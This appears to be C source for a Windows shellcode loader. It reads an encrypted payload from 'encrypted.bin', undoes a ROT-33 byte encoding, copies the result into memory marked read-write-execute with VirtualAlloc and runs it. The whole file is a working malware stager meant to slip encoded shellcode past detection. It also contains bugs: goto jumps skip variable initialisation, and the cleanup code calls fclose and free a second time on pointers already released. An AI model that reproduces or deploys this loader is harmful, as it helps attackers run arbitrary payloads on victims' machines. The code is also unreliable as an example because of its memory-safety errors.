//#include "stdafx.h"  // Uncomment if using Visual Studio precompiled headers
#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>

void rot_n(unsigned char *byte, int n);

int main() {
    const char *filename = "encrypted.bin";
    int rotation_value = 33;  // Example ROT value for decryption

    // Open the file to get its size
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Error opening file");
        goto cleanup;
    }

    // Get the size of the file
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (file_size <= 0) {
        fprintf(stderr, "Error: File size is invalid!\n");
        fclose(file);
        goto cleanup;
    }

    // Allocate dynamic memory for the shellcode array
    unsigned char *shellcode = (unsigned char *)malloc(file_size);
    if (shellcode == NULL) {
        fprintf(stderr, "Error: Failed to allocate memory for shellcode!\n");
        fclose(file);
        goto cleanup;
    }

    // Read the encrypted shellcode into memory
    if (fread(shellcode, 1, file_size, file) != file_size) {
        fprintf(stderr, "Error: Failed to read the entire file into memory!\n");
        free(shellcode);
        fclose(file);
        goto cleanup;
    }
    fclose(file);

    // Allocate memory for the final executable shellcode
    void *exec = VirtualAlloc(NULL, file_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        fprintf(stderr, "Error: VirtualAlloc failed!\n");
        free(shellcode);
        goto cleanup;
    }

    // Decrypt each byte and print it for debugging
    printf("Decrypted shellcode bytes:\n");
    for (long i = 0; i < file_size; i++) {
        rot_n(&shellcode[i], -rotation_value);  // Decrypt the byte
        printf("%02x ", shellcode[i]);  // Print the decrypted byte in hexadecimal format
        if ((i + 1) % 16 == 0) printf("\n");  // Format output in rows of 16 bytes
    }
    printf("\n");

    // Copy the decrypted shellcode into executable memory
    memcpy(exec, shellcode, file_size);

    // Free the dynamically allocated memory for shellcode (optional after memcpy)
    free(shellcode);

    printf("Shellcode is now in executable memory. Press Enter to execute...\n");
    getchar();

    // Execute the shellcode
    ((void(*)())exec)();

cleanup:
    // Clean up allocated resources
    if (file) fclose(file);
    if (shellcode) free(shellcode);
    if (exec) VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}

// ROTN function to encrypt or decrypt a byte
void rot_n(unsigned char *byte, int n) {
    *byte = (*byte + n + 256) % 256;  // Add 256 to ensure non-negative results for decryption
}
